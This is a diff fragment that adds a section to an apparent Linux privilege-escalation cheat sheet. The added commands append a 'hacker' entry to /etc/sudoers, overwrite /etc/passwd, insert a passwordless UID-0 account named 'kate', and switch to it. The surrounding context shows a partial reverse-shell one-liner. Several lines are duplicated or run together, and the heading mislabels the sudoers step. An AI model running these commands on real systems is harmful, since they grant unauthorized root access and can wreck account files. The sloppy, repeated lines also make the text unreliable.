@@ -517,6 +517,27 @@ set PATH="/tmp:/usr/local/bin:/usr/bin:/bin" echo "rm /tmp/f;mkfifo /tmp/f;cat /
 
 ```
 
+### Add root user to passwd if file is writeable
+
+echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
+
+cat /etc/passwdcat /etc/passwd
+
+cat /etc/group 
+
+cat /etc/group 
+
+cat /etc/group
+
+grep -vE "nologin" /etc/passwd
+
+echo test > /etc/passwd 
+
+echo 'kate::0:0:kate:/bin/bash' >> /etc/passwd
+
+cat /etc/passwd
+
+su kate
 
 ### Unmounted filesystems
 
